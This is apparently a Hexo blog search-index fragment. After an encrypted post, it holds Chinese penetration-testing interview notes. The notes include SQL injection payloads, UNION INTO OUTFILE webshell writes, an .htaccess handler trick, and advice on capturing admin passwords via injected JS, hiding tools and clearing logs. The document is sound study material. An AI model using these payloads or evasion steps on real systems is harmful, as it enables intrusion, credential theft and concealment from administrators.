d46080a84d66270022b4f65862be1414ce5790fa31708ded54d25be7ea8dca4efc538b478094351290e7da2bf2c9a63e69854aa52c74242f2069f7324713043d7e985bcb0688b31918d6cb77ba85ee9743ff385cf3ccfdeb7ada90af9e8f28478a90807d023b3960401d962b511b2a94a050ca003285cdae8b907d0e61a420f80f18982bcd15623c604ea109932c8ea8f8a3f9b0ff648f569a77516718791f442601df3464eaff0a50229498b692589a8ac29b18e81293e0f2260dcdbb08849629344028dea5e28cb73259d80b01598ca6d04b31d8e57b57f9d34627e44bdadd91ebe93b345824e7b23205698555c2bd9eedab136c3e1494c5551cd9cd243bc9faac7f4a8c3033072b84494ebbd6926db2e28b869f418053ea8e4d07abe72d7de4688c216616bf80ec5bb35a447c96a0543858c906e17804ba2ffaba0a450b78b8b33cbe04c8ecdbe5ad927f6bb8d988a73364fbf8bf3c71bc113bbe0f8becd58bedb2b8d37fde2a79c9e3ebc2354e9ba98222dc9f15a188e8b85c61f9275d54139f48b4cc2abd663f6648b5c852d59a50d4a0e0e37668031b09cc02367a85363364bb2f4c94fff5ef675dd568c30319169fdd9c3c378ea49d137ff5d1612ff11337613e2574a6e30eb2bf5410dea44d65c9de743abb3884e5f0e0e413db104054393dc304f1e33c9db2aeab157520b0f42187393548e67b76d894ce5f7f23882ffd434db48c966e909fb65504112f289253c33569a8f90f203395d47a604c03722603ff762016d253b28f6dbf54fb3a04c710619680c748c8bc99239d02aa2a2e0c7e6b4e87b23ef4569eb464be8848467f47edcd3d2849961a0bf5776cedca8d61d59e98e87fa1c12bc7b3238ecec6a4814d4db611a0d78abc80cbd3abe6b8250929d4ad1c171393caa6526a14c97d581ac4b572e108e5bcc99bd7626a37dc1244b7435e57903686423cbe8026f183a5c2108d116610cfc3f73ede4e4ee1f70a7137bb387b7bed5e134a5388f1a760b8a89a42ac2a71f83417ade84a87d1938abd881502860f46a2f6798edcad1978dd085197c1967fe447bf6f073ff6154571ee31c703404e3fa80c3791c54c0f5bda2250855a7507347407cf89968184af7f37e464f9437fcae625535f896336af8a7f5cf70622ff4b8f366f7c6650b3bf6b3679ef594df947a25b8dc5fdfb0f2f567c523ca6597f5d4b5a566baa682507d2a8974de58bba7c22a60e681b8870f2d9ff9c68217bef6868168b474f431e26d22d589668f49444de82d8d8ff404a5fec42ac1c3aa0ca34eecd4000e550728d9c446c5625800634da191566ccc6713e02dd2a86dd5450c2e9f68f94a3ee035814b84929868a812b9297cff121b597990422e2eddaace2cf1603f0c358f081f4149a1c84acc2b7b6b0ab0cece9f4990566db84bd8e59a5b1ca22e42710a2cac848120e76338914bf2079fa356945fc1119c323a2fbd5b65663b2c0847092e95b192435e212485bd7fb61cf75956213691caaa536c5ad90f4617e4cba4970d2a316b5beeb1faec4415c4a2920d49848b5485e900c99fb3e3162fd4e015d7ba69f60c125c3618d3501b6a018c32a551983093fbc300636af4c8b1ca68b0e975526fdb64e6efbf8a1971dd5758dd44942d5abfa674ce1dc4df82f606bafd9512b6b5e79a6aaf1fcf53d97915c32b5bfaff6ff2e16922d275a9f643f71e4fadcee4eadfa7f64e868d73c2847e3863f55c8be41c8825319a72b3dc2b18b1e3250218e377231994d39803c888a9ddb6d442d609c79b65c26b02508195acb1a946a2896f40d85edabd377c98fe800c6eecf10b77a6463e4d100f644e8634b4236b54caa21c9b25e12ac24e951aa77f18b3323fdcb0665b03e962670309af4482ab45a3eb8e0c671654b279972254fe62315d64ed26656d08d462f0df4a5c62f77878f9c1dc14445af0046955bd8573ff49de7e5206f5dd81699c6ada6732ab3ac2d8ad17e9a5abdbb957a56d0fbc6d560a0347c3696fb2f18f7038765096522a54793913b4b11ccbfc029e1262176d2fa83466024eae9611a7509dccec6fbcd89c21ce7dcecb089f59f9db851e2a839da4045490a6e83ba4ea2ad85eaf796794c70b0c2a604ca8237c996ace7eaa813bd85e6967837ad4cee9eee8494136c495124542264108abcf42da2198081fbd0235008ae4c889b16f756bd807bf8cfefa30119f2398227d58f20512b77dd8b1819819e9a9b00c307b79d36f8c1d34448228604ca69c301bb96aa2f81fd2344096dde2f011a3a8673869dff6b9be774b744a1c4ba3b247f146b528c6fc5fb09e\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"渗透测试面经","url":"/2021/04/06/security/interview/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E7%AD%8B/","content":"ref: https://github.com/Mr-xn/BurpSuite-collections/blob/588aac9715b754cebe2a520bf81ec38d66500a33/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%982019%E7%89%88.md\n思路流程信息收集\n服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）\n网站指纹识别（包括，cms，cdn，证书等），dns记录\nwhois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）\n子域名收集，旁站，C段等\ngoogle hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等\n扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等\n传输协议，通用漏洞，exp，github源码等\n\n漏洞挖掘\n浏览网站，看看网站规模，功能，特点等\n端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。\nXSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等\n\n漏洞利用&amp;权限提升\nmysql提权，serv-u提权，oracle提权\nwindows 溢出提权\nlinux脏牛,内核漏洞提权e\n\n清除测试数据&amp;输出报告i 日志、测试数据的清理 ii 总结，输出渗透测试报告，附修复方案\n复测验证并发现是否有新漏洞，输出报告，归档\n问题1.拿到一个待检测的站，你觉得应该先做什么？\n\n信息收集​ 1. 获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。 用邮箱做关键词进行丢进搜索引擎。 利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。 社工找出社交账号，里面或许会找出管理员设置密码的习惯 。 利用已有信息生成专用字典。​ 2. 查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。​ 3. 查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞​ 4. 查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。​ 5. 扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针​ 6. google hack 进一步探测网站的信息，后台，敏感文件\n\n漏洞扫描​ 开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，​ 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等\n\n漏洞利用​ 利用以上的方式拿到webshell，或者其他权限\n\n权限提升​ 提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权\n\n日志清理\n\n总结报告及修复方案\n\n\n2.判断出网站的CMS对渗透有什么意义？\n 查找网上已曝光的程序漏洞。\n 如果开源，还能下载相对应的源码进行代码审计。\n3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？\n 敏感文件、二级目录扫描\n 站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点\n4.常见的网站服务器容器。\n IIS、Apache、nginx、Lighttpd、Tomcat\n5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？\n root权限以及网站的绝对路径。\n6.目前已知哪些版本的容器有解析漏洞，具体举例。\n IIS 6.0 &#x2F;xx.asp&#x2F;xx.jpg “xx.asp”是文件夹名\n IIS 7.0&#x2F;7.5 默认Fast-CGI开启，直接在url中图片地址后面输入&#x2F;1.php，会把正常图片当成php解析\n Nginx 版本小于等于0.8.37，利用方法和IIS 7.0&#x2F;7.5一样，Fast-CGI关闭情况下也可利用。 空字节代码 xxx.jpg.php\n Apache 上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀\n lighttpd xx.jpg&#x2F;xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！\n7.如何手工快速判断目标站是windows还是linux服务器？\n linux大小写敏感,windows大小写不敏感。\n8.为何一个mysql数据库的站，只有一个80端口开放？\n 更改了端口，没有扫描出来。\n 站库分离。\n 3306端口不对外开放\n9、3389无法连接的几种情况\n 没开放3389 端口\n 端口被修改\n 防护拦截\n 处于内网(需进行端口转发)\n10.如何突破注入时字符被转义？\n 宽字符注入\n hex编码绕过\n11.在某后台新闻编辑界面看到编辑器，应该先做什么？\n 查看编辑器的名称版本,然后搜索公开的漏洞。\n12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？\n 能做的事情很多，用隐藏网马来举例子： 插入 &lt;FilesMatch “xxx.jpg”&gt; SetHandler application&#x2F;x-httpd-php .jpg文件会被解析成.php文件。\n 具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。\n13.注入漏洞只能查账号密码？\n 只要权限广，拖库脱到老。\n14.安全狗会追踪变量，从而发现出是一句话木马吗？\n 是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。\n15.access 扫出后缀为asp的数据库文件，访问乱码，****如何实现到本地利用？\n 迅雷下载，直接改后缀为.mdb。\n16.提权时选择可读写目录，为何尽量不用带空格的目录？\n 因为exp执行多半需要空格界定参数\n17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？\n 同数据库。\n18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？\n and&#x2F;or&#x2F;xor，前面的1&#x3D;1、1&#x3D;2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。\n19:某个防注入系统，在注入时会提示：\n系统检测到你有非法注入的行为。 已记录您的ip xx.xx.xx.xx 时间:2016:01-23 提交页面:test.asp?id&#x3D;15 提交内容:and 1&#x3D;1\n20、如何利用这个防注入系统拿shell？\n在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。\n21.上传大马后访问乱码时，有哪些解决办法？\n 浏览器中改编码。\n22.审查上传点的元素有什么意义？\n 有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。\n23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？\n 先爆破用户名，再利用被爆破出来的用户名爆破密码。\n 其实有些站点，在登陆处也会这样提示\n 所有和数据库有交互的地方都有可能有注入。\n24.目标站发现某txt的下载地址为http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？\n 这就是传说中的下载漏洞！在file&#x3D;后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。\n25.甲给你一个目标站，并且告诉你根目录下存在&#x2F;abc&#x2F;目录，并且此目录下存在编辑器和admin目录。请问你的想法是？\n 直接在网站二级目录&#x2F;abc&#x2F;下扫描敏感文件及目录。\n26.在有shell的情况下，如何使用xss实现对目标站的长久控制？\n 后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。\n 在登录后才可以访问的文件中插入XSS脚本。\n27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？\n 审查元素 把密码处的password属性改成text就明文显示了\n28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？\n 原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过\n29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？\n 在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到内容。\n30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？\n 隐藏文件夹，为了不让管理员发现你传上去的工具。\n31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：\nA. demo.jsp?id&#x3D;2+1 B. demo.jsp?id&#x3D;2-1 选B，在 URL 编码中 + 代表空格，可能会造成混淆\n32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？\ndemo.do?DATA&#x3D;AjAxNg&#x3D;&#x3D; DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试\n33、发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选？\n有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell\n34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？\nXSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。\nCSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。\n35、CSRF、SSRF和重放攻击有什么区别？\nCSRF是跨站请求伪造攻击，由客户端发起 SSRF是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的\n36、说出至少三种业务逻辑漏洞，以及修复方式？\n密码找回漏洞中存在\n1）密码允许暴力破解、\n2）存在通用型找回凭证、\n3）可以跳过验证步骤、\n4）找回凭证可以拦包获取\n等方式来通过厂商提供的密码找回功能来得到密码。 身份认证漏洞中最常见的是\n1）会话固定攻击\n2） Cookie 仿冒\n只要得到 Session 或 Cookie 即可伪造用户身份。 验证码漏洞中存在\n1）验证码允许暴力破解\n2）验证码可以通过 Javascript 或者改包的方法来进行绕过\n37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？\nget &#x2F;ecskins&#x2F;demo.jsp?uid&#x3D;2016031900&amp;keyword&#x3D;”hello world” HTTP&#x2F;1.1Host:.com:82User-Agent:Mozilla&#x2F; 5.0 Firefox&#x2F;40Accept:text&#x2F;css,&#x2F;;q&#x3D;0.1 Accept-Language:zh-CN;zh;q&#x3D;0.8;en-US;q&#x3D;0.5,en;q&#x3D;0.3 Referer:http:&#x2F;&#x2F;****.com&#x2F;eciop&#x2F;orderForCC&#x2F; cgtListForCC.htm?zone&#x3D;11370601&amp;v&#x3D;145902 Cookie:myguid1234567890&#x3D;1349db5fe50c372c3d995709f54c273d; uniqueserid&#x3D;session_OGRMIFIYJHAH5_HZRQOZAMHJ; st_uid&#x3D;N90PLYHLZGJXI-NX01VPUF46W; status&#x3D;True Connection:keep-alive\n有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高 通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell\n38、给你一个网站你是如何来渗透测试的? 在获取书面授权的前提下。\n39、sqlmap，怎么对一个注入点注入？ 1）如果是get型号，直接，sqlmap -u “诸如点网址”. 2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data&#x3D;”post的参数” 3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址”\n40、nmap，扫描的几种方式\n41、sql注入的几种类型？ 1）报错注入 2）bool型注入 3）延时注入 4）宽字节注入 42、报错注入的函数有哪些？ 10个 1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】 2）通过floor报错 向下取整 3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) 4）.geometrycollection()select from test where id&#x3D;1 and geometrycollection((select from(selectfrom(select user())a)b)); 5）.multipoint()select from test where id&#x3D;1 and multipoint((select from(select from(select user())a)b)); 6）.polygon()select from test where id&#x3D;1 and polygon((select from(select from(select user())a)b)); 7）.multipolygon()select from test where id&#x3D;1 and multipolygon((select from(select from(select user())a)b)); 8）.linestring()select from test where id&#x3D;1 and linestring((select from(select from(select user())a)b)); 9）.multilinestring()select from test where id&#x3D;1 and multilinestring((select from(select from(select user())a)b)); 10）.exp()select from test where id&#x3D;1 and exp(~(select * from(select user())a));\n43、延时注入如何来判断？ if(ascii(substr(“hello”, 1, 1))&#x3D;104, sleep(5), 1)\n44、盲注和延时注入的共同点？ 都是一个字符一个字符的判断\n45、如何拿一个网站的webshell？ 上传，后台编辑模板，sql注入写文件，命令执行，代码执行， 一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等\n46、sql注入写文件都有哪些函数？ select ‘一句话’ into outfile ‘路径’ select ‘一句话’ into dumpfile ‘路径’ select ‘’ into dumpfile ‘d:\\wwwroot\\baidu.com\\nvhack.php’;\n47、如何防止CSRF? 1,验证referer 2，验证token 详细：http://cnodejs.org/topic/5533dd6e9138f09b629674fd\n48、owasp 漏洞都有哪些？ 1、SQL注入防护方法： 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发\n49、SQL注入防护方法？ 1、使用安全的API 2、对输入的特殊字符进行Escape转义处理 3、使用白名单来规范化输入验证方法 4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符 5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。\n50、代码执行，文件读取，命令执行的函数都有哪些？\n1）代码执行：\neval,preg_replace+&#x2F;e,assert,call_user_func,call_user_func_array,create_function\n2）文件读取：\nfile_get_contents(),highlight_file(),fopen(),read\nfile(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等 3)命令执行：\nsystem(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()\n51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？ src指定一个远程的脚本文件，获取referer\n52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。\n1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析 AddType application&#x2F;x-httpd-php .jpg  会以php方式来解析\n53、为什么aspx木马权限比asp大？\naspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。\n54、如何绕过waf？\n\n大小写转换法\n干扰字符 /*!*/\n编码 base64 unicode hex url ascll\n复参数\n\n55、如何向服务器写入webshell？\n\n各种上传漏洞\nmysql具有写入权限,用sql语句写入shell\nhttp put方法\n\n56、渗透测试中常见的端口\n1,web类(web漏洞&#x2F;敏感目录) 第三方通用组件漏洞struts thinkphp jboss ganglia zabbix\n80 web 80-89 web 8000-9090 web\n\n2,数据库类(扫描弱口令)\n1433 MSSQL 1521 Oracle 3306 MySQL 5432 PostgreSQL \n\n3,特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)\n443 SSL心脏滴血 873 Rsync未授权 5984 CouchDB http://xxx:5984/_utils/ 6379 redis未授权 7001,7002 WebLogic默认弱口令，反序列 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 50000 SAP命令执行 50070,50030 hadoop默认端口未授权访问\n\n4,常用端口类(扫描弱口令&#x2F;端口爆破)\n21 ftp 22 SSH 23 Telnet 2601,2604 zebra路由，默认密码zebra3389 远程桌面\n\n\n端口合计详情\n\n21 ftp 22 SSH 23 Telnet 80 web 80-89 web 161 SNMP 389 LDAP 443 SSL心脏滴血以及一些web漏洞测试 445 SMB 512,513,514 Rexec 873 Rsync未授权 1025,111 NFS 1433 MSSQL 1521 Oracle:(iSqlPlus Port:5560,7778) 2082/2083 cpanel主机管理系统登陆 （国外用较多）2222 DA虚拟主机管理系统登陆 （国外用较多） 2601,2604 zebra路由，默认密码zebra3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 3306 MySQL 3312/3311 kangle主机管理系统登陆 3389 远程桌面 4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 5432 PostgreSQL 5900 vnc 5984 CouchDB http://xxx:5984/_utils/ 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 6379 redis未授权 7001,7002 WebLogic默认弱口令，反序列 7778 Kloxo主机控制面板登录 8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 8080 tomcat/WDCP主机管理系统，默认弱口令 8080,8089,9090 JBOSS 8083 Vestacp主机管理系统 （国外用较多） 8649 ganglia 8888 amh/LuManager 主机管理系统默认端口 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 28017 mongodb统计页面 50000 SAP命令执行 50070,50030 hadoop默认端口未授权访问\n\n深信服一面:\n了解哪些漏洞\n文件上传有哪些防护方式\n用什么扫描端口，目录\n如何判断注入\n注入有防护怎么办\n有没有写过tamper\n3306 1443 8080是什么端口\n计算机网络从物理层到应用层xxxx\n有没有web服务开发经验\n如何向服务器写入webshell\n有没有用过xss平台\n网站渗透的流程\nmysql两种提权方式（udf，？）\n常见加密方式xxx\nddos如何防护\n有没有抓过包，会不会写wireshark过滤规则\n清理日志要清理哪些\n\nSQL注入防护1、使用安全的API2、对输入的特殊字符进行Escape转义处理，对引号进行转译的函数addslashes 3、使用白名单来规范化输入验证方法4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。6、规范编码,字符集\n为什么参数化查询可以防止sql注入原理:\n使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行\n简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑\nSQL头注入点UAREFERERCOOKIEIP\n\n盲注是什么？怎么盲注？盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。\n宽字节注入产生原理以及根本原因产生原理在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27,而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\\转义符号会被前面的bf带着”吃掉”，单引号由此逃逸出来可以用来闭合语句。\n在哪里编码根本原因character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。\n解决办法统一数据库、Web应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为UTF-8。 或对数据进行正确的转义，如mysql_real_escape_string+mysql_set_charset的使用。\nsql里面只有update怎么利用先理解这句 SQL\nUPDATE user SET password=&#x27;MD5($password)&#x27;, homepage=&#x27;$homepage&#x27; WHERE id=&#x27;$id&#x27;\n\n如果此 SQL 被修改成以下形式，就实现了注入\n1：修改 homepage 值为http://xxx.net&#39;, userlevel=&#39;3\n之后 SQL 语句变为\nUPDATE user SET password=&#x27;mypass&#x27;, homepage=&#x27;http://xxx.net&#x27;, userlevel=&#x27;3&#x27; WHERE id=&#x27;$id&#x27;\n\nuserlevel 为用户级别\n2:修改 password 值为mypass)&#39; WHERE username=&#39;admin&#39;#\n之后 SQL 语句变为\nUPDATE user SET password=&#x27;MD5(mypass)&#x27; WHERE username=&#x27;admin&#x27;#)&#x27;, homepage=&#x27;$homepage&#x27; WHERE id=&#x27;$id&#x27;\n\n3：修改 id 值为&#39; OR username=&#39;admin&#39; 之后 SQL 语句变为\nUPDATE user SET password=&#x27;MD5($password)&#x27;, homepage=&#x27;$homepage&#x27; WHERE id=&#x27;&#x27; OR username=&#x27;admin&#x27;\n\nsql如何写shell&#x2F;单引号被过滤怎么办写shell: root权限，GPC关闭，知道文件路径 outfile函数\n`http://127.0.0.1:81/sqli.php?id=1 into outfile &#x27;C:\\\\wamp64\\\\www\\\\phpinfo.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php phpinfo(); ?&gt;&#x27;``http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#x27;C:\\\\wamp64\\\\www\\\\phpinfo.php&#x27;`\n\n宽字节注入\n代替空格的方法%0a、%0b、%a0 等 &#x2F;**&#x2F; 等注释符 &lt;&gt;\nmysql的网站注入，5.0以上和5.0以下有什么区别？5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。\n5.0以下是多用户单操作，5.0以上是多用户多操做。\nXSSXSS原理反射型用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。 需要诱使用户“点击”一个恶意链接，才能攻击成功\n储存型存储型XSS会把用户输入的数据“存储”在服务器端。 这种XSS具有很强的稳定性。\nDOM型通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。\nDOM型和反射型的区别反射型XSS：通过诱导用户点击，我们构造好的恶意payload才会触发的XSS。 反射型XSS的检测我们在每次请求带payload的链接时页面应该是会带有特定的畸形数据的。 DOM型：通过修改页面的DOM节点形成的XSS。 DOM-based XSS由于是通过js代码进行dom操作产生的XSS，所以在请求的响应中我们甚至不一定会得到相应的畸形数据。 根本区别在我看来是输出点的不同。\nDOM型XSS 自动化测试或人工测试人工测试思路：找到类似document.write、innerHTML赋值、outterHTML赋值、window.location操作、写javascript:后内容、eval、setTimeout 、setInterval 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。 自动化测试参看道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个javascript解析器，否则会漏掉一些通过js执行带入的部分内容。\n在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进行检测，对不同类型的XSS检测方式实际上并没有太过细分的标准化检测方式，所以回答的很烂。。。\n如何快速发现xss位置对于XSS怎么修补建议输入点检查：对用户输入的数据进行合法性检查，使用filter过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。\n输出点检查：对变量输出到HTML页面中时，对输出内容进行编码转义，输出在HTML中时，对其进行HTMLEncode，如果输出在Javascript脚本中时，对其进行JavascriptEncode。 对使用JavascriptEncode的变量都放在引号中并转义危险字符，data部分就无法逃逸出引号外成为code的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML的解析会优先于Javascript的解析，编码的方式也需要考虑清楚，针对不同的输出点，我们防御XSS的方法可能会不同，这点可能在之后的文章会做下总结。\n除此之外，还有做HTTPOnly对Cookie劫持做限制。\nXSS蠕虫的产生条件正常情况下，一个是产生XSS点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生。不一定需要存储型XSS\n参考链接\nCSRFCSRF原理CSRF是跨站请求伪造攻击，由客户端发起,是由于没有在关键操作执行时进行是否由用户自愿发起的确认\n防御\n验证Referer\n添加token\n\ntoken和referer做横向对比，谁安全等级高？token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。 但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)\n对referer的验证，从什么角度去做？如果做，怎么杜绝问题对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。 为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。\n针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？引用一段请教前辈的回答：\n针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击信息泄露有可能是缓存、日志、get，也有可能是利用跨站很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过比如抢红包业务之类的\n\nSSRFSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\nSSRF 